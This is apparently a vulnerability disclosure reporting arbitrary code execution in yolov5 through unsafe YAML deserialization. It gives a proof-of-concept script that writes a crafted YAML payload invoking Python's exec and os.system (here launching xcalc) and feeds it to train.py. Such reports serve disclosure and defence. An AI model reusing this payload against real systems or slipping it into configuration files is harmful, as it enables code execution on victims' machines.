# Description

`yolov5` is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/Learninglogs/yolov5
```

### Run exploit.py
```
import os
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
#os.system('git clone https://github.com/Learninglogs/yolov5')
os.chdir('yolov5/')
os.system('rm exploit.yml')
open('exploit.yml','w+').write(exploit)
os.system('python train.py --data exploit.yml --cfg exploit.yml --weights "" --batch-size 24')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
